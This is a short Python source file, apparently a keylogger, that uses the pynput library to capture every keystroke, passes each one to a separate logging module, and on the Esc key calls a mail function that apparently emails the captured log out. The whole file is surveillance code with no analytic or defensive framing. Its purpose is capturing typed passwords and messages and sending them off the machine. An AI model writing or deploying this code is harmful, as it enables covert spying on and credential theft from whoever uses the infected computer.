from pynput import keyboard, mouse
from logs import logs
from mails import mail

def on_press(key):
    try:
        logs.save_logs(str(key.char))

    except AttributeError:
        logs.save_logs(f'[{key}]')

def on_release(key):
    if key == keyboard.Key.esc:
        mail.send_email()
        # Stop Listener
        return False
    
if __name__ == '__main__':
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
